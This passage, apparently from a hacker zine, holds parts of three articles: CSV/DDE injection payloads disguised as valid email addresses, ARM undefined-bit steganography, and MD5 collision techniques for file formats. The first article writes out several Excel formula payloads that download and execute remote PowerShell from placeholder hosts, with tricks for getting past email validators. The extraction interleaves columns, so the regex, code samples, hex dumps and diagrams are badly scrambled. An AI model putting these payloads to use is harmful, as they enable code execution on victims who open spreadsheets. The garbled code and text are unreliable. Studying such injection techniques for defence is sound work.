as an escape sequence, and instead uses doubling to
indicate that a character should be treated literally.
Consequently, this means that we can use either "
or ’’ sequences to use string literals in PowerShell.
For now, we will use the latter, as they are less un-
sightly.
=cmd|’/C powershell calc’!z
For reference, /C is one of two necessary op-
tions for CMD.EXE to execute the remainder of the
command, the other being /K. The former instructs
CMD.EXE to exit after it has finished executing its
command. The latter keeps CMD.EXE running after-
wards. Additionally, the powershell calc segment
should be understood as being equivalent to typing
those exact characters into a CMD.EXE shell and tap-
ping the enter key ever so gently. As for the !z
in the last three commands, we derive no joy from
specifying a DDE item name, but DDE requires that
one be supplied nonetheless and the author likes the
letter z.
As all good neighbors know, a static payload that
starts a toy calculator is not a worthy PoC. Instead,
dynamic payloads obtained from a remote server are
the proper PoC path to enlightenment. Ask not
what you can do for PowerShell, but what Power-
Shell can do for you. As a verbose veneer on top
of C]/.NET, PowerShell has many different ways to
do networking, but only one decent way to evaluate
strings of code.
=cmd|’/C powershell
Invoke-Expression((New-Object Net.WebClient)
.DownloadString(”https://example.tld”))’!z
Invoke-Expression((New-Object Net.WebClient)
.DownloadString(’https://example.tld’))
The above, lacking any commas to muck up our
code, is a valid CSV file, and, when opened in Excel,
will prompt the following two warnings that differ
ever so slightly from the previous ones. The for-
mer is a stern warning about how a neighbor’s com-
puter may “no longer be secure.” The latter now
asks about starting ’CMD.EXE’. While it is worth
noting that an Excel spreadsheet file (*.xslx) with
an =Excel| DDE reference followed by a =cmd| ref-
erence will prompt the former followed by a “Yes to
All” prompt listing only the ’EXCEL -X’ command,
this is not the case for CSV files. They will always
prompt the stern warning, followed by the CMD.EXE
prompt, and lastly the EXCEL.EXE -X prompt, with
each execution attempt prompted individually.
The above expression will instantiate a .NET
WebClient object and invoke its DownloadString
method on a supplied URL. DownloadString will
simply return the response body of the HTTP
request performed. Invoke-Expression() is the
PowerShell name for what is named eval() in nearly
every programming language that has such a fea-
ture.
But embedding this snippet into our DDE call is
not as simple as it seems. While it may not appear
obvious at first, we cannot use bare single quotes in
our CMD.EXE input as Excel DDE uses single quotes
to bound “topic” and “item” values, the former of
13The “simple” form of email address that most
neighbors are familiar with is a restricted subset of
the “dot-atom” form, whereby the “username” seg-
ment of the address (referred to in the spec and here-
after as the “local-part”) can consist of only alphanu-
merics and the following characters:
! # $ % & ’ * + - / = ? ^ _ ‘ { | } ~
Additionally, period characters (i.e. “.”) are sup-
ported as long as they do not start or end the
local-part, nor appear consecutively. As can be ob-
served, this supplies us with the majority of the
characters we need to write a vanilla CMD.EXE DDE
call. However, it lacks the spaces we need between
/C, powershell, and the PowerShell input. For-
tunately, we can take advantage of the fact that
CMD.EXE will treat = characters between arguments
as spaces (it will also treat ; the same, but that
is not in the dot-atom list). However, it should be
noted that this is only the case for CMD.EXE and
batch command structures; we cannot successfully
call powershell=calc. Luckily, CMD.EXE supports
piping just like Unix shells, and we can take advan-
tage of this:
Email Addresses and RFC 5322
Hark, dear neighbors. If you thought we were done,
you would be only half right. For what is the point
of a PoC if it lacks realism. Any heathen can throw
some PowerShell in a text file and call it a CSV.
But it is the enlightened mind that can meld multi-
ple formats together to form the quintessential PoC,
a polyglot. But first, let us speak of that great evil,
email. SMTP is a sinful protocol not only for its
built-in dependence on DNS to supply the domain
name of the mail server, but also for the initial “stan-
dardization” of email addresses, which are “most ac-
curately” described in RFC 5322. 6 You see, dear
neighbors, the email addresses you may have come
to know are naught but a finite range of the infinite
unknown that awaits us. The soulless corporations,
and even Unix (due to the corruptive influence of
Ma Bell) have deceived you, and led you to blissful,
ignorant damnation.
Email addresses are such fantastical things, that
the only true way to validate their existence is to ask
them if they exist. Many—possibly most, in fact—
get this crucial step of email validation wrong. And
the most slothful among them barbarously attempt
to apply the regex chainsaw to this philosophical
quandary as if it were a simply felled tree. No, dear
neighbor, the humble email address is not as hum-
ble as it at first appears, and sits high(er) on the
Chomsky hierarchy. How high is a question for an-
other time, but, among other things, its recursively
nestable comments imply that it cannot be parsed
by legitimate regular expressions. For the differ-
ences between real and fake regular expressions, the
author recommends Russ Cox’s soothing treatise on
the subject. 7
6 unzip
=cmd|’/C=echo=calc|powershell’!@example.tld
This works in the simple case, but, alas, email
addresses have another devious limitation: the local-
part can only be up to 64 characters long, as de-
clared separately in RFC 2821. 8 Therefore, neigh-
bors, we need to enact some measures to trim our
payload. Thankfully, we can apply the following
truths in pursuit of this goal:
1. The space between /C and powershell is not
necessary, as CMD.EXE will pass every charac-
ter after a /C or /K as command input.
2. Invoke-Expression is a cmdlet and has a
shorter alias of iex.
3. In PowerShell 3.0 (Windows 8+, backport to
Windows 7), the Invoke-WebRequest cmdlet
is a suitable replacement for DownloadString,
especially as it has a shorter alias of iwr.
While PowerShell functions can be executed in-
dividually with spaces, we cannot use spaces here,
and, even if we could, calls cannot be nested prop-
erly using spaces. While PowerShell can use pipes
to forward arguments into calls, CMD.EXE does not
pocorgtfo19.pdf rfc5322.txt
7 https://swtch.com/~rsc/regexp/regexp1.html
8 unzip
pocorgtfo19.pdf rfc2821.txt
14Rails is still a Ghetto
offer us a good way to echo a pipe character that is
piped into a powershell call; the CMD.EXE/batch
^ escape character has forsaken us.
Regard-
less, Invoke-WebRequest does not take piped in-
put. However, dot-atom sequences may begin and
end with a CFWS (comment-folding-whitespace)
sequence, which begin and end with open and
close parentheses, respectively, and may contain
any nested number of such pairs. Comments ad-
ditionally support backslash-escaped “quoted-pair”
sequences for characters that would otherwise not
be supported. However, comments directly allow
the use of following characters unescaped (in addi-
tion to several miscellaneous control characters):
Neighbors, it is with great sorrow that I inform you
that, as of this writing, Ruby on Rails’ email val-
idation routine 10 is completely incorrect. 11 For as
hard as it tries, it simply does not understand the
fundamentals of an email address. First and fore-
most, it has no understanding of comments, and,
outside of a quoted string, it will not accept paren-
theses or colons, the latter of which is necessary in
the URL string to achieve glorious TLS. And with-
out the semicolon and other magical characters of-
fered by comments, it is extremely difficult to chain
operations (within a single email).
We therefore shift focus to the “quoted-string”
email format, which offers a wider variety of le-
gal characters. However, the gem Rails uses inter-
nally to validate emails does not understand quoted-
string local-parts either. Instead of following the
spec, which clearly indicates that the entire local-
part unit must be a single quoted-string bounded by
raw double quote characters ("), it instead splits the
local-part by periods and then applies the quoted-
string processing. Furthermore, it does not allow
raw space characters within quoted strings, and ex-
pects them to be backslash escaped, in clear indig-
nation of the RFC. As such, we can, as always, de-
vise a Rails-specific workaround that is still a valid
email address. For reference, Lamson 12 appears to
leave all such validation to the application devel-
oper since they might decide to do very custom mail
routing. On that note, Python’s email.utils.-
parseaddr function will always perform uncompli-
ant legacy comment handling, 13 whereby the com-
ment in our above email will be shifted into the name
of the user when parsed.
! " # $ % & ’ * + , - . /
0 1 2 3 4 5 6 7 8 9
: ; < = > ? @
ABCDEFGHIJKLMNOPQRSTUVWXYZ
[]^_‘
abcdefghijklmnopqrstuvwxyz
{ | } ~
With all of these, we can put together the fol-
lowing email address padded out to the maximum
local-part length of 64:
=cmd|’/C=echo=
iex(iwr(”https://1234567890.1234”))
|powershell’!@example.tld
Depending on how hard one is trying to “vali-
date” an email address, the above will either pass
or fail validation. For what it is worth, the above
will pass the generally accepted 99.99% compliant
regex. 9
1 >>> from e m a i l . u t i l s im po rt p a r s e a d d r
(?:[a-z0-9!#$%&’*+/=?^_‘{|}~-]+(?:\.
>>> p a r s e a d d r ( "<=cmd | ’ /C=echo=i e x ( i w r ( ’ ’
,→ [a-z0-9!#$%&’*+/=?^_‘{|}~-]+)*|"(?:
https ://1234567890.1234 ’ ’) ) | powershell ’ !
,→ [\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d
@example . t l d >" )
,→ -\x7f]|\\
3 ( " ( iwr ’ ’ https ://1234567890.1234 ’ ’) " ,
,→ [\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:
"=cmd | ’ /C=echo=i e x | p o w e r s h e l l ’ ! @example . t l d "
,→ (?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9]
)
,→ (?:[a-z0-9-]*[a-z0-9])?|\[(?:
,→ (?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}
,→ (?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?
,→ |[a-z0-9-]*[a-z0-9]:
,→ (?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53
The first potential trouble we run into is the fact
,→ -\x7f]|\\
that
our CSV injection requires an =, +, -, or @ char-
,→ [\x01-\x09\x0b\x0c\x0e-\x7f])+)\])
9 https://www.regular-expressions.info/email.html
10 Line 57 of validate_email.rb from https://github.com/hallelujah/valid_email/
11 Ibid., issue 95.
12 git clone https://github.com/zedshaw/lamson
13 RFC5322, Section 3.4.
15acter to be the first in the cell. CSV uses double
quotes to encapsulate data. Thankfully, that the
raw CSV data starts with a double quote is not a
concern, as Excel will parse the cell as starting from
the first character within the quoted-string. This
gives us the following starting point: Tying the best of these together, we can obtain
the following.
"=cmd|’/Ccalc’!"@example.tld Coincidentally, the backslash-prepended inner
double quotes required by quoted-string local-parts
are also exactly what we need in our powershell
input, as mindful neighbors will remember that
CMD.EXE strips unescaped double quote characters
from command arguments. This also gives us just
enough space for TLS:
"\",=cmd|’/Cpowershell;
iex(iwr(\"123456789$([char]46)1234\"))’
!"@example.tld
However, for future reference, in the event a
neighbor needs to break out of the middle of a cell,
the following format may be used:
"AAAAAAAA\",=cmd|’/Ccalc’!"@example.tld
"\",=cmd|’/Cpowershell;
iex(iwr(\"https://123$([char]46)12\"))’
!"@example.tld
In the above CSV “breakout” version, which we
will base all following work on for maximum pwn-
ability, we leverage the fact that the backslash in the
email quoted-pair double quote is not recognized as
an escape character by CSV, causing the CSV cell
to terminate at the comma. This starts the next cell
with an equal sign.
Due to the incorrect parsing of double quote
characters and periods, the Rails email validator will
not accept a quoted-string that contains a period,
it will only accept two quoted-strings joined by a
period. Needless to say, that makes for an invalid
email, and we want to receive our mails. We there-
fore need a way to encode the necessary period in
our domain name.
Unlike most programming languages, PowerShell
does not have functioning format string capabilities,
and lacks good (read terse) ways to do byte-numeric-
string conversions. The standard way to generate a
period literal in PowerShell is 46 -as [char], but
we can remove the spaces and still have a sequence,
46-as[char], that works. And yet there is an even
shorter form we can use.
"\",=cmd|’/Cpowershell;
iex(iwr(\"https://12$([char]46)123\"))’
!"@example.tld
TLS is very important here as PowerShell sends
HTTP requests with a very observable user-agent:
Mozilla/5.0 (Windows.NT; Windows.NT 10.0; en-US)
WindowsPowerShell/5.1.16299.98
Receiving Your Emails
As most popular email providers do not allow their
users to register accounts involving the more esoteric
characters in the email address specification, the
author recommends running one’s own mail server.
Configuring qmail with both IPv6 and TLS is left
as an exercise for the reader.
[char]46
There are two main ways to do string concate-
nation in PowerShell:
’a’+’b’+’c’
and
’a{0}c’ -f ’b’
Additionally PowerShell supports variable ex-
pansion, which requires double quoted strings.
"a$(’b’)c"
1619:04
Undefining the ARM
by Eric Davisson
The Concept
I’m here today to tell you fine folks about a re-
cent adventure with the ARM architecture, in which
I scrambled the undefined bits of instructions to
break disassembly without breaking the program’s
execution.
ARM was something I hadn’t touched, so I dug
up an old Raspberry Pi and what looked to be a
great online resource for learning assembly language,
specifically for the Pi. Although it had one handy
section on GPIO at the end, this book turned out
to be terrible.
Fed up with shallow introductions, I registered
with ARM and downloaded the 2,700 page manual.
I had to admire the structure and order of the in-
struction encodings. For the 32-bit form, each in-
struction is exactly 32 bits, rather than varying from
1 to 15 bytes like x86. Most instructions are condi-
tional, and the first four bits define the conditions.
(0b1110 is the default for unconditional execution.)
When browsing the alphabetical instruction list and
instruction encoding parts of the manual, I saw that
certain bit fields even subdivided instructions into
different categories. Some bits then define the spe-
cific instruction, and after that, you’re pretty much
left with the operand data fields.
For the register form of the MOV command (MOV Rd,
Rm), we have the 32 bits shown in Figure 1.
As I’ve mentioned before, those first four bits
specify under what condition to execute this MOV in-
struction. The next three bits, 000, put this instruc-
tion into the Data-processing (register) category, a
fairly common one. Other categories include Load-
/Store, Media, Branch, and Co-processor. The next
five (really four) bits of 1101x puts us into a sub-sub-
category of Moves, Shifts, and Rotates. The
two bits near the end further divide this into either
a MOV or LSL. The five bits of 00000 is what defines
this as a specific instruction of MOV (register). We
then have the Rd and Rm fields, which just specify
which of the 16 registers to use. Finally the S bit
defines whether the condition flags are set or not
after the instruction is executed.
Well, we skipped a piece! Nothing explained
what the (0)(0)(0)(0) bits were. So let’s flip some
and try it out!
In GNU’s as assembler, you use the .word direc-
tive to place an arbitrary 32-bit piece of data where
an instruction might go. 14 This is a valid instruc-
tion of MOV r0, pc, defined in 0b form so that we
can see the individual bits.
. word 0 b 1 1 1 0 0 0 0 1 1 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1
The Program Counter (PC) register is the 15th
(1111) register, and it is much like EIP in x86. After
stepping through this instruction in gdb, I confirmed
that the value of PC+4 is moved into the r0 register,
just as expected. So that is my baseline, my control.
Next I flipped one of those (0) bits.
1 . word 0 b 1 1 1 0 0 0 0 1 1 0 1 0 0 0 0 1 0 0 0 0 0 0 0 0 1 1 1 1
14 Editor’s Note: All instructions in this article are presented as 32-bit words, rather than as bytes, to better match the ARM
manual’s descriptions.
15 rasm2 -e -a arm -D "e1a0000f e1a1000f"
17I put both of those instructions in my program
for comparison, finding that both gdb and objdump
failed to disassemble it. 15
it worked flawlessly. At this point the generaliza-
tions seem to hold, but I had only tested against
one program.
Still, I wondered if by changing this bits from
one instruction, I might convert it to some other in-
struction. To assure myself, I checked by having a
script definitively investigate every encoding. Based
on the encodings in the ARM manual, there should
be no overlap here.
Just for safe measure I tested a few other pro-
grams. My favorite was modifying a quarter of
objdump, then feeding it itself as an argument to
show it report that quarter of its own instructions
are undefined.
1 0 x10420 main+24 mov
r0 , pc
0 x10424 main+28 ;<UNDEFINED> i n s : 0 x e 1 a 1 0 0 0 f
Even though the disassembler shows the second
instruction as undefined, both of them behave iden-
tically, moving PC+4 into r0!
At this point, a false prophet might declare that
wherever an instruction matches one with undefined
bits, we can flip these bits without changing the be-
havior of the program. And like many things a false
prophet might say, this is almost true, but lacking
one or two important details. Here, the details mat-
ter.
When it Literally isn’t Code!
So now that I was executing modified code, I still
needed to know whether these invalid instructions
ever occurred naturally in the wild. So I loosened up
the parsing for my profiler script to not just match
on the valid instruction encodings, but invalid ones
too.
The answer to my question was disturbing: there
were many of these illegal instructions in the wild! I
later found the rate of this occurrence to be evenly
distributed from 0-13%. It would get much higher
for libraries. I knew something was off about this,
as it just wouldn’t make sense for assemblers to do
this on purpose. Something else was going on.
I finally got a hint when my script began to
break, and the breaking change was that I was now
matching on all forms of instructions, and not just
the validly defined ones. Why would it be safe to
change any valid instruction, but not these ten per-
cent of already-invalid ones? It turns out I made
one of the biggest assumption of all, that the .text
section is pure code!
So here’s what happened: In fixed-width instruc-
tion sets like ARM and PowerPC, there is no room
in the instruction for a register-wide pointer. ARM
solves this problem by placing a pool of literals into
ARM Wrestling
I call my PoC ARMaHYDAN, to pay tribute to
the 2004 HYDAN stego tool for x86 by El-Khalil
and Keromytis. 16 Like many readers of this fine
journal, I am not interested in steganography as a
tool to hide information; rather, I love the idea that
file formats–and also instruction sets!–have hidden
nooks and crannies ignored by their interpreters.
First I cataloged all of the instructions that had
these optional bits. From four hundred or so in-
structions, ignoring conditional codes, only 141 in-
structions had these bits.
The first script I wrote flipped the last optional
bit for all valid instructions in an executable. I did
this to /usr/games/worm in the bsdgames package,
because I like that game. My script used readelf
to locate and parse the offset and size of the .text
section; as I only wanted to flip the bits for the code
of the program.
About a quarter of the output’s .text section
appeared to be undefined! I then ran the game, and
16 unzip
2
pocorgtfo19.pdf hydan.pdf hydan-0.13.tar.gz
31|30|29|28|27|26|25|24|23|22|21|20|19|18|17|16|15|14|13|12|11|10|09|08|07|06|05|04|03|02|01|00
cond
| 0
0
0| 1
1
0
1| S |(0) (0) (0) (0)
Rd
| 0
0
0
0
0| 0
0| 0|
Rm
Figure 1. Bitfields of the MOV Instruction.
18the code, then referencing that location with fewer
bits, relative to the program counter.
So when you see ldr r2, =0xdeadbeef in the
disassembly, you will also see 0xdeadbeef as a lit-
eral later in the code. These four bytes are not an
instruction, but they are in the .text section, and
its important not to damage them.
To really understand the situation, I wrote a pro-
filer script to run against my entire Raspbian in-
stallation. It showed that these false positives were
distributed across more than half the possible in-
struction set! It was also evenly distributed enough
to not be able to justify blacklisting a couple of in-
structions and hoping for the best.
Well, that’s in the context of statically black-
listing some instructions. I considered running an
initial profiling pass of the program I’m trying to
modify to tally the invalid instructions (most likely
data) and keep track of this as a blacklist and store
it as metadata. The dynamically blacklisted instruc-
tions could be ignored for injecting data into, and
the extracting routine could look to the blacklist in
metadata to not extract data from those instruc-
tions. One downside to this is that more metadata
is at the cost of how much data I can inject.
Then I realized that I could encode the entire
blacklist in just one byte, by prioritizing the instruc-
tions. The byte would simply be the number of high-
trouble matches to skip.
I profiled my whole system for a list of instruc-
tions based on frequency in a few contexts. The first
is just the occurrence of instructions period. This
found the top five instructions with optional bits to
be MOV (register), CMP (immediate), MOV (immedi-
ate), CMP (register), and LSL (immediate). The top
fife for false positives, that are actually data, with
option bits are LDRD (register), STRD (register), STRH
(register), MUL, and MRS.
We aren’t so lucky that the full lists are mutually
exclusive, but they are certainly dissimilar enough to
truly minimize the second data loss problem. This
is because the instructions I’m actually blacklisting
are in the minority of instructions that are actu-
ally valid and therefore used. We are losing only a
marginal amount of storage space for our injection!
Comparing my top ten lists, the MUL instruction
is the only one in both my top ten lists, ranked
fourth for false positives but tenth for popularity,
making up less than one percent of valid instruc-
tions. By choosing the right threshold, these lists
oughtn’t conflict or get in the way of our storage.
Not Solving the Code/Data Problem
This means I ran into a very old problem, the code
versus data problem. My early tests worked out of
luck, but that luck ran out when I loosened up the
parser can began modifying words in the .text sec-
tion that were not code.
I noticed these false positive instructions did not
show up in a consistent frequency; some of them
occurred way more than others. For a while it
only seemed that two or three problem instructions
seemed to show up, so I took them out of my script
and everything worked after that. But still, only for
the small subset of programs I was modifying and
testing.
19Steganalysis
Native
e10100d0
e10100f0
e10100b0
e0100090
e11000d0
e11000b0
e11000f0
e1100080
e3100080
e1500080
e1300080
e1700080
e3700080
e3300080
e1100010
e3500080
e1400090
e1700010
e1500010
e1300010
f1010000
e1200050
e03000b0
e03000d0
e03000f0
e12000a0
...
As I said in the very beginning, using rare machine
encodings to inject data for steganography is easily
detectable. The concept in HYDAN was that there
are different (valid) ways to encode the same assem-
bly instruction, partly because of how messed up
things get with x86’s MODRM/SIB tables and redun-
dancies introduced with not being able to do mem-
ory to memory operand instructions. (These are just
two basic reasons; there are more.)
Take xor eax, eax for example. There is an
encoding for xor r32m32, r32 and also one for xor
r32, r32m32. In other words, there’s a variation for
a pointer being the first or second operand depend-
ing on the encoding, even though you can choose a
register for both. So if you did just choose a register
for both, which encoding do you use? Assemblers
will prefer only one in this kind of situation, even
though both execute in a valid way. A steganogra-
pher could use this information to call one encoding
a 1, and the other a 0, and encode data with this
method. But knowing that, if I suspect an x86 pro-
gram to be stego’d, the first thing I would check for
is the uncommonly encoded instructions like that.
The situation is no different for ARMaHYDAN.
Invalid instructions, whether data or stego, ought
to be less than 13% of all 32-bit words in the .text
section, and by carefully observing which ones are
executed, it oughtn’t be hard to identify the exis-
tence of hidden content.
Assembly
ldrd r0, [r1, -r0]
strd r0, [r1, -r0]
strh r0, [r1, -r0]
muls r0, r0, r0
ldrsb r0, [r0, -r0]
ldrh r0, [r0, -r0]
ldrsh r0, [r0, -r0]
tst r0, r0, lsl #1
tst r0, #128
cmp r0, r0, lsl #1
teq r0, r0, lsl #1
cmn r0, r0, lsl #1
cmn r0, #128
teq r0, #128
tst r0, r0, lsl r0
cmp r0, #128
swpb r0, r0, [r0]
cmn r0, r0, lsl r0
cmp r0, r0, lsl r0
teq r0, r0, lsl r0
setend le
qsub r0, r0, r0
ldrht r0, [r0], -r0
ldrsbt r0, [r0], -r0
ldrsht r0, [r0], -r0
smulwb r0, r0, r0
...
Modified
e10101d0
e10101f0
e1010fb0
e0101090
e11001d0
e11001b0
e11001f0
e1101080
e3101080
e1501080
e1301080
e1701080
e3701080
e3301080
e1101010
e3501080
e1400190
e1701010
e1501010
e1301010
f1010401
e1200150
e03001b0
e03001d0
e03001f0
e12010a0
...
Figure 2. ARM Instructions with a Null Byte
Cut out the NULLs!
Final Thoughts
Another nifty result of this project is that many
of the null bytes in ARM machine code contain at
least a bit or two that the CPU will ignore. Take
a moment to reread the brilliant Phrack 66:12, in
which Yves Younan and Pieter Philippaerts used
a dozen clever tricks to make alphanumeric self-
modifying shellcode in a creole dialect of both ARM
and Thumb, 17 then consider how much easier it
might be if so many of their blacklisted instruc-
tions 18 could be smuggled in by flipping a bit here
or there.
This project is not ground breaking, but by reading
the ARM manual and chasing down the unexplained
bitfields, I managed to learn a lot about the archi-
tecture and have some fun in the process.
As you read my code, 19 please remember that
the fun is in the journey and not the destination.
Don’t just theorize about what new tricks might be
done! Read the documentation, and when the inspi-
ration hits, run the experiments that will teach you
the facts you need to write a nifty proof of concept.
17 unzip
pocorgtfo19.pdf phrack6612.txt
§2.3.
19 git clone https://github.com/XlogicX/ARMaHYDAN || unzip pocorgtfo19.pdf ARMaHYDAN.zip
18 Ibid,
2019:05
An MD5 Pileup Fit for Jake and Elwood
by Albertini and Stevens
This article is about applying known hash colli-
sions to common file formats. It is not about new
collisions—the most recent one we’ll discuss was doc-
umented in 2012—but instead focuses on the byte
patterns techniques that are exploited in the present
attacks and are likely to continue being useful for fu-
ture ones.
We’ll extensively explore existing attacks, show-
ing once again just how weak MD5 is (instant col-
lisions of any of JPG, PNG, PDF, MP4, PE, etc.),
and will also explore how the common file format
features help the attacker construct colliding files.
Indeed, the same file format tricks can be used on
several hashes, as long as the collisions follow the
same byte patterns. Compare, for instance, the
JPEG tricks from PoCkGTFO 14:10 and the ma-
licious SHA1 collision from the SHAttered project.
Follow along and we’ll learn the moves of the
collision dance, the tricks of the trade for collid-
ing different valid files so that they share a single
hash. We’ll begin by reviewing the available colli-
sion techniques, then show how real world files can
be abused within the constraints of the available,
practical block collisions.
While we can’t yet generate a file for an arbi-
trary MD5 hash, we can generate identical prefix
collisions (FastColl, UniColl, SHAttered) and even
chosen prefix collisions (HashClash). Because both
hashed and file formats often run from beginning to
end, these prefixes can be freely reused after gen-
eration to produce two arbitrary files that obey a
specific file format (PNG, JPG, PE, etc.) with the
same hash.
As an extreme example, making two different
files with the same SHA1 took 6,500 core years, but
now that those prefixes have been computed, we can
instantly produce two different PDFs with the same
SHA1 hash that show different pictures. 21
Attacks
MD5 and SHA1 both operate on blocks of 64 bytes.
If two content blocks A and B have the same hash,
then appending (we’ll write “+” for append) the
same suffix C to both will retain equality of the total
hash.
hash(A) = hash(B) ⇒ hash(A + C) = hash(B + C)
State of the art
Collisions of files with fixed different prefixes
work by inserting at a block boundary some num-
ber of computed collision blocks that depend on
what came before in the file. These collision blocks
are very random-looking with some minor differ-
ences, which follow a specific pattern for each attack.
These tiny differences eventually get the hashes to
converge to the same value after these blocks.
The key thing about file formats that makes this
method work is that file formats also work top-down,
and most of them work are interpreted as byte-level
chunks. So the format requirements and the col-
lision block insertion can be aligned to make valid
format files with specific properties.
Inert comment chunks can be inserted to align
file chunks to block boundaries, to align specific
structures to collision blocks differences, to hide the
rest of the collision blocks’ randomness from the file
parsers, and to hide otherwise valid content from the
parser, so that it will see different content.
There are different ways in which we may want to
construct colliding files, depending on whether we
want to control the files’ contents or the hashes
themselves. The current status of known attacks—as
of December 2018—is as follows:
Generating a file that matches a specific fixed
hash is still impractical with MD5 and everything
stronger. It is impractical even with MD2, 20 but
can be done for simpler hashes such as Python’s
crypt(). The following example is thanks to Sven,
(@svblxyz).
>>> im por t c r y p t
2 >>> c r y p t . c r y p t ( " 5dUD&66" , " br " )
’ brokenOz4KxMc ’
4 >>> c r y p t . c r y p t ( "O! > ’ ,% $ " , " br " )
’ brokenOz4KxMc ’
20 unzip
21 git
pocorgtfo19.pdf thomsenmd2.pdf
clone https://github.com/nneonneo/sha1collider
21would prevent PNG reusable collisions other-
wise.
These comment chunks were typically not meant
to be actual comments. They are just used as data
containers that are ignored by the parser. For ex-
ample, PNG chunks with a lowercase-starting ID are
ancillary, not critical.
Most of the time, a difference in the collision
blocks is used to modify the length of a comment
chunk, which is typically declared just before the
data of this chunk: in the gap between the shorter
and the longer version of the chunk, another com-
ment chunk is declared to jump over some content
A. After this content A, we then simply append an-
other content B. Since file formats usually define a
terminator that make parsers stop when they reach
it, A terminates parsing, so that the appended con-
tent B is ignored.
plann
e
comp d before
utatio
n
comp
utatio
result n
• Flat structure. For example, ASN.1 defines
a parent structure with the length of all the
enclosed substructures, which prevents these
constructs: you’d need to abuse the length,
but also the length of the parent. Note, how-
ever, that this feature of ASN.1 creates multi-
ple sources of truth for the parsers, and puts
the onus of checking that all these pieces of
data agree on the parser itself. This is how
you get Heartbleed.
• Allowing a comment to precede the header.
This makes generic reusable collisions possi-
ble.
header
comment
variable
length
length
ion
collis ck
blo
long
Now that we have the theory down, let’s learn
some moves.
short
comment
appe
nd
comp ed after
utatio
n
content 1
content 2
1
2
common
layout
1
2
file 1
1
Identical Prefix Collisions
Identical prefix files look almost identical. Their
content have only a few bits of differences in the
collisions blocks. All blocks before the collision are
fixed and cannot be changed without recomputing
the collision, while all blocks of the suffix are mal-
leable and can altered so long as they stay equal to
those in the colliding file.
2
file 2
Typically, at least two comments are needed: one
for block alignment, another to hide collision blocks.
A third one may be needed to hide one file’s con-
tents, for reusable collisions.
The following common properties of file formats
enable the construction of colliding files. These
properties are not typically seen as weaknesses, but
they can be detected or normalized out, making the
attacker’s task considerably harder:
1. Define an arbitrary prefix. Its content and
length don’t matter.
2. Pad the prefix to the next 64-byte block.
3. Compute and append collision block(s) de-
pending on the prefix. These blocks will look
very random, with the specific differences pre-
determined by the attack.
• Dummy chunks that can be used as comments.
• Allowing more than one comment.
• Long comments. For example, lengths of 64b
for MP4 and 32b for PNG make for trivial col-
lisions, whereas 16b for JPG, 8b for GIF make
for no generic collision for GIF, and limited
ones for JPG.
4. After the block(s), the hash value is the same
despite the file differences.
5. Add any arbitrary identical suffix as needed.
• Storage arbitrary binary data in a comment,
rather than just text or valid data.
|
|
|
|
• Allowing arbitrary data after the terminator.
• A lack of integrity checks. For example,
CRC32 in PNGs are usually ignored, but
22
Prefix
| = |
:----:
|:-:|
Collision *A* |!= |
Suffix
| = |
Prefix
|
:----:
|
Collision *B* |
Suffix
|Exploitation There are two classic ways of ex-
ploiting identical prefix collisions. The first is the
data exploit: run code that checks for differences
and displays one or the other. (This is typically
trivial because differences are known in advance.)
The second is the structure exploit, which we use a
difference in the file structure, such as the length of
a comment, to hide one content or show the other.
Here are two files with this structure, collided to
show either A or B as determined by a switch in the
collision.
|
|
|
|
|
Prefix
| = |
:----:
|:-:|
Collision *A* |!= |
**A**
| = |
~~B~~
| = |
don’t control any nearby bytes. A potential solu-
tion is to brute-force the surrounding bytes. See
PoCkGTFO 14:10.
An example with an empty prefix:
MD5: fe6c446ee3a831ee010f33ac9c1b602c
SHA256: c5dd2ef7c74cd2e80a0fd16f1dd6955c
626b59def888be734219d48da6b9dbdd
00: 37 75 C1 F1-C4 A7 5A E7-9C E0 DE 7A-5B
39-C9 6C 5F 02-12 C2 7F DA-CD
10: 02 AB D9 39
20: 8C ED FA F3-E1 A3 FD B4-EF 09 E7 FB-B1
30: CD 91 C8 45-E6 6E FD 3D-C7 BB 61 52
52-3E
40: 49 11 85 69-EB CC 17 9C-93 4F 40 EB-33
FB-15 FA 20 1D-D1 DB 17 CD-DD
50: A4 09 2D FB
60: 39 89 9E F6-79 46 9F E6-8B 85 C5 EF-DE
70: C2 78 75 9D-8B 65 F4 50-EA 21 C5 59
59-18
Prefix
|
:----:
|
Collision *B* |
~~A~~
|
**B**
|
PREFIX
00: 37 75 C1 F1-C4 A7 5A E7-9C E0 DE 7A-5B
B9-C9 6C 5F 02-12 C2 7F DA-CD
10: 02 AB D9 B9
20: 8C ED FA F3-E1 A3 FD B4-EF 09 E7 FB-B1
30: CD 91 C8 45-E6 6E FD 3D-C7 BB 61 D2
D2-3E
40: 49 11 85 69-EB CC 17 9C-93 4F 40 EB-33
50: A4 09 2D 7B
7B-15 FA 20 1D-D1 DB 17 CD-DD
60: 39 89 9E F6-79 46 9F E6-8B 85 C5 EF-DE
70: C2 78 75 9D-8B 65 F4 50-EA 21 C5 D9
D9-18
MD5: fe6c446ee3a831ee010f33ac9c1b602c
SHA256: e27cf3073c704d0665da42d597d4d201
31013204eecb6372a5bd60aeddd5d670
art
ical p
Ident controL)
r
(unde
File a
s
mnes
?
Rando
art
ical p
Ident controL)
r
(unde
..
..
..
..
..
..
..
..
..
..
..
..
..
X.
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
X.
..
..
..
..
..
..
X.
..
..
..
.X
..
..
..
..
..
The differences aren’t near the start or the end
of the blocks, so it’s very hard to exploit since you
80
A3
9A
E0
AD
59
4E
FF 26
B0
1D
38
20
1E
46
7B
Here are its scorecard and a map of differences.
22 https://marc-stevens.nl/research/md5-1block-collision/
23 unzip
24 git
10
0D
43
F4
02
29
C2
62
UniColl lets you control a few bytes in the col-
lision blocks, before and after the first difference.
This makes it an identical-prefix collision with some
controllable differences, the next best thing to a cho-
sen prefix collision. This is very handy, and even
better, the difference can be very predictable: in
the case of m2+= 2^8 (a.k.a. N=1 / m2 9 in Hash-
Clash poc_no.sh script), the difference is +1 on the
ninth byte. This makes it very useful in exploita-
tion, as you can reason about the collision in your
head: the ninth character of that sentence will be
replaced with the next one. 0 is replaced by 1, a is
